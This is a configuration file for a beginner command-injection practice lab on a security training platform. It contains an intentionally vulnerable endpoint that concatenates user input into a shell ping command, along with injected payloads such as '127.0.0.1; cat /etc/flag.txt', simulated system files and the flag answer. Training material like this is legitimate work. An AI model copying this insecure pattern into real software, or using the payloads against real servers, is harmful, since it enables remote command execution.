// src/modules/practice-labs/command-injection/labs/lab1/lab1.metadata.ts
import type { LabMetadata } from '../../../types/lab-metadata.type';

export const cmdLab1Metadata: LabMetadata = {
  slug: 'cmdi-basic-network-diagnostic-ping',
  title: 'Command Injection: Basic — Network Diagnostic Tool (Ping)',
  ar_title: 'حقن الأوامر: أساسي — أداة تشخيص الشبكة (Ping)',
  description:
    'Exploit a basic command injection vulnerability in a network diagnostic tool where user-supplied input is passed directly to a shell command without sanitization. Chain shell operators to execute arbitrary commands on the server.',
  ar_description:
    'استغل ثغرة حقن أوامر أساسية في أداة تشخيص شبكة حيث يتم تمرير المدخلات مباشرة إلى أمر shell بدون تعقيم. استخدم shell operators لتنفيذ أوامر عشوائية على الخادم.',
  difficulty: 'BEGINNER',
  category: 'WEB_SECURITY',
  skills: [
    'Command Injection',
    'Shell Operators',
    'OS Command Execution',
    'Input Validation Bypass',
  ],
  xpReward: 120,
  pointsReward: 60,
  duration: 25,
  executionMode: 'SHARED_BACKEND',
  isPublished: true,
  goal: 'The IT portal has a ping diagnostic tool. Inject shell operators into the host parameter to break out of the ping command and read the contents of /etc/flag.txt on the server.',
  scenario: {
    context:
      'NetOps IT portal has a network diagnostic feature that runs ping on a user-supplied hostname. The backend executes: exec("ping -c 1 " + userInput). No input sanitization is applied. An attacker can append shell operators (;, &&, ||, |) to terminate the ping command and execute arbitrary OS commands.',
    vulnerableCode: `// Network diagnostic endpoint (vulnerable):
app.post('/network/ping', isAuthenticated, async (req, res) => {
  const { host } = req.body;
  // ❌ Direct string concatenation into shell command!
  const result = await exec(\`ping -c 1 \${host}\`);
  res.json({ output: result.stdout });
});`,
    exploitation:
      'Send host: "127.0.0.1; cat /etc/flag.txt" — the shell executes both commands. The semicolon terminates ping and starts a new command. Also try: 127.0.0.1 && cat /etc/flag.txt or 127.0.0.1 | cat /etc/flag.txt',
  },
  hints: [
    {
      order: 1,
      xpCost: 10,
      content:
        'Try the tool with a normal host like "127.0.0.1". Now what if you add a semicolon after it? What does ";" mean to a shell?',
    },
    {
      order: 2,
      xpCost: 20,
      content:
        'Shell operators: ";" runs next command always. "&&" runs if first succeeds. "||" runs if first fails. "|" pipes output. Try: 127.0.0.1; whoami',
    },
    {
      order: 3,
      xpCost: 35,
      content:
        'POST /network/ping with { "host": "127.0.0.1; ls /" }. You should see the root directory listing in the response.',
    },
    {
      order: 4,
      xpCost: 50,
      content:
        'POST /network/ping with { "host": "127.0.0.1; cat /etc/flag.txt" } to read the flag file.',
    },
  ],
  flagAnswer: 'FLAG{CMDI_BASIC_PING_SHELL_OPERATOR_INJECTION}',
  initialState: {
    contents: [
      {
        title: 'FLAG_FILE',
        body: JSON.stringify({
          path: '/etc/flag.txt',
          content: 'FLAG{CMDI_BASIC_PING_SHELL_OPERATOR_INJECTION}',
        }),
        author: 'system_file',
        isPublic: false,
      },
      {
        title: 'ETC_PASSWD',
        body: JSON.stringify({
          path: '/etc/passwd',
          content:
            'root:x:0:0:root:/root:/bin/bash\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nnetops:x:1001:1001:NetOps Service:/home/netops:/bin/bash',
        }),
        author: 'system_file',
        isPublic: false,
      },
      {
        title: 'WHOAMI',
        body: JSON.stringify({ output: 'www-data' }),
        author: 'system_cmd',
        isPublic: false,
      },
      {
        title: 'LS_ROOT',
        body: JSON.stringify({
          output:
            'bin\nboot\netc\nhome\nlib\nopt\nproc\nroot\nrun\nsrv\ntmp\nusr\nvar',
        }),
        author: 'system_cmd',
        isPublic: false,
      },
    ],
  },
};
